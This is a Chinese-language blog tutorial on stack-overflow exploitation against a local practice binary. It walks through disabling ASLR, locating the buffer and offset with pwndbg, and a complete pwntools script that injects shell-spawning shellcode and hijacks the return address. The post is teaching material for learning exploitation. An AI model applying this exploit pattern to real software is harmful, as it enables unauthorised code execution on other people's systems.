@@ -1,0 +1,193 @@
+---
+title: 'shellcode'
+date: '2023-08-08'
+lastmod: '2023-08-20'
+tags: ['PWN', 'Stack']
+draft: false
+summary: '运行你自己的指令'
+authors: ['default']
+---
+
+在真正的漏洞利用中，你不太可能拥有 `win()` 函数。shellcode 是一种允许 **运行你自己的
+指令** 的方法，使你能够在系统上运行任意命令。
+
+**shellcode** 本质上是 **一系列汇编指令**，一旦我们将它输入到二进制文件中，它就会覆盖返回
+地址（返回指针）以劫持代码，并执行我们自己的指令。
+
+:::warning
+我保证你可以相信我，但你永远不应该在不知道 shellcode 作用的情况下运行它。
+pwntools 很安全，并且几乎拥有你需要的所有 shellcode 。
+:::
+
+shellcode 成功的原因是 [冯·诺伊曼结构](https://zh.wikipedia.org/wiki/%E5%86%AF%C2%B7%E8%AF%BA%E4%BC%8A%E6%9B%BC%E7%BB%93%E6%9E%84)（当今大多数计算机使用的体系结构）不区分
+数据和指令——无论你告诉它在哪里运行或运行什么内容，它都会尝试运行它。因此，
+即使我们输入的是攻击指令，计算机也不知道这一点，我们可以利用它来发挥我们的优势。
+
+LINK
+
+## 0x01 禁用 ASLR
+
+ASLR 是一种安全技术，虽然它不是专门为对抗 shellcode 而设计的，但它涉及随机化
+内存的某些方面，可以看我的这篇博客：[NOPs](https://www.cubeyond.net/nops/) 。这种随机化可能会使我们的 shellcode
+变得不可靠，所以我们现在将 [禁用](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization) 它。
+
+```bash
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+:::info
+类似这样的功能性指令以后还会碰到更多，我建议使用 `alias` 为它们创建一个别名。
+因为就算不考虑能不能记住这些指令，如果每次都手动输入那么长的指令也是一件很
+浪费时间的事情。
+:::
+
+:::warning
+再次强调，如果你不知道指令的作用，则永远不要运行该指令。
+:::
+
+## 0x02 确定缓冲区位置
+
+使用 `pwndbg` 调试 `vuln` ，并找出缓冲区在内存中的起始位置；这就是我们
+想要将返回地址指向的位置。
+
+```
+$ pwndbg vuln
+$ disass unsafe
+[...]
+0x0804918a <+24>:	lea    eax,[ebx-0x1ff8]
+[...]
+0x0804919c <+42>:	lea    eax,[ebp-0x134]
+[...]
+0x080491ac <+58>:	mov    ebx,DWORD PTR [ebp-0x4]
+[...]
+```
+
+可以根据大小判断哪个是 **局部变量**。根据缓冲区大小是 300，可以判断出
+`ebp-0x134` 很可能是缓冲区。让我们在 `gets()` 之后设置一个断点并找到确切
+的返回地址。
+
+```
+$ b *0x080491a8
+$ r
+Overflow me
+<<IM HERE>>  <== This was my input
+$ x/20s $esp
+[...]
+0xffffd664:	"<<IM HERE>>"
+[...]
+```
+
+它似乎位于 `0xffffd664` ；如果我们多次运行二进制文件，它应该保持在原来的位置
+（如果没有，请确保 **禁用 ASLR！**）。
+
+## 0x03 计算溢出 Padding
+
+现在我们需要计算溢出 Padding 。我们将使用 De Bruijn 序列，如上一篇 [文章](https://www.cubeyond.net/de-bruijn-sequences/) 中所述。
+
+```
+$ pwndbg vuln
+$ cyclic 500
+<COPY THIS>
+$ r
+Overflow me
+<<PASTE HERE>>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x64616164 in ?? ()
+[...]
+$ cyclic -l 0x64616164
+Finding cyclic pattern of 4 bytes: b'daad' (hex: 0x64616164)
+Found at offset 312
+```
+
+得到溢出 Padding 是 312 字节。
+
+## 0x04 编写 Exploit
+
+为了使 shellcode 正确，我们将把 `context.binary` 设置为我们的二进制文件；
+这会获取诸如架构、操作系统和位数之类的东西，并使 pwntools 能够为我们提供
+shellcode 。
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+context.binary = ELF('./vuln')
+
+p = process()
+```
+
+:::info
+我们可以只使用 `process()` ，因为一旦设置了 `context.binary` 就默认假定
+使用该进程。
+:::
+
+现在我们可以使用 pwntools 出色的 shellcode 功能轻易的构建 shellcode 。
+
+```python
+payload = asm(shellcraft.sh())      # 构建 Shellcode
+payload = payload.ljust(312, b'A')  # 溢出 Padding
+payload += p32(0xffffd664)          # 返回地址
+```
+
+现在让我们将其发送出去并使用 `p.interactive()` ，它使我们能够与 shell 通信。
+
+```python
+p.sendline(payload)
+
+p.interactive()
+```
+
+:::warning
+如果你遇到 `EOFError` ，请打印出 shellcode 并尝试在内存中查找它。
+栈地址可能是错误的。
+
+你可以参考这篇 [博客](https://www.cubeyond.net/ret2win/) 中的 hook 调试方法来解决这个问题。
+:::
+
+```
+$ python exp.py
+[*] 'vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[+] Starting local process 'vuln': pid 39321
+[*] Switching to interactive mode
+Overflow me
+$ whoami
+cub3y0nd
+```
+
+## 0x05 最终 Exploit
+
+```python:exp.py
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='info')
+
+context.binary = ELF('./vuln')
+
+p = process()
+
+payload = asm(shellcraft.sh())
+payload = payload.ljust(312, b'A')
+payload += p32(0xffffd664)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+## 0x06 总结
+
+- 当提示输入时，我们注入了 shellcode
+- 然后，我们通过覆盖栈上保存的返回地址以指向我们的 shellcode
+来劫持代码执行
+- 一旦返回地址压入 EIP 中，它就指向我们的 shellcode
+- 这导致程序执行我们的指令，为我们（在本例中）提供了用于执行
+任意命令的 shell
+
